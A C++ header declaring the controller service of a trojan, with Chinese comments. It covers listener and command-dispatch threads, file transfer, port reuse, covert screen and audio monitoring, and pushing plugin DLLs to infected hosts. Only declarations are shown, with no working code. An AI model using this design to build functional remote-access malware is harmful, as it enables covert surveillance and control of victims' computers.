#if !defined(AFX_MASTERSERVICE_H__9A868FBA_F91C_4EAD_892A_AA7AC94281EA__INCLUDED_)
#define AFX_MASTERSERVICE_H__9A868FBA_F91C_4EAD_892A_AA7AC94281EA__INCLUDED_

#include <vector>
#include <map>
#include "iPlug.h"

typedef void* conn;

class MasterService : public IService
{
public:
	MasterService();
	virtual ~MasterService();

	virtual BOOL OnInitalize();
	virtual BOOL OnUninitalize();	
	virtual BOOL OnService(UINT, WPARAM, LPARAM);
	
	//客户端监听线程，每当有一个新的连接，创建一个新的线程DispatchThread
	static unsigned int WINAPI ListenThread(void* param);
	
	//命令分发线程
	static unsigned int WINAPI DispatchThread(void* param);

	//文件上传线程
	static unsigned int WINAPI FileUpDownThread(void* param);

	//端口复用线程
	static unsigned int WINAPI PortReuseThread(void* param);

	//屏幕监控线程
	static unsigned int WINAPI MonitorScreenThread(void* param);

	//屏幕监控线程
	static unsigned int WINAPI MonitorAudioThread(void* param);

	//发送指令数据给木马目标端
	int SendMsgToTrojan(WPARAM wp);

	//对从木马端接受的数据进行处理
	int ProcessRecvData(WPARAM wp, LPARAM lp);

	//打开某个监听端口
	int OpenListenPort(int type, unsigned short port, bool update = false);

private:
	//更新木马状态
	void UpdateTrojanStatus(DispatchData* da, bool online);
	
	void RecordDllInfo(char* guid, int dataLen, char* data);
	
	//更新配置文件信息
	void UpdateProfile();

	//上传插件
	int UpdateOneDll(const char* path, const char* fileName);
	void UpdatePlugins();

private:
	char					iniFileName[MAX_PATH];
	BOOL					m_bExit;					
	std::vector<HANDLE>		m_vDispatchHandles;
	std::vector<conn>		m_allConns;
	std::map<int, HANDLE>	m_allListenThreads;
	std::map<int, unsigned int> m_allListenThreadIds;
	std::map<void*, struct TrojanInfo> m_allInfos;
};

#endif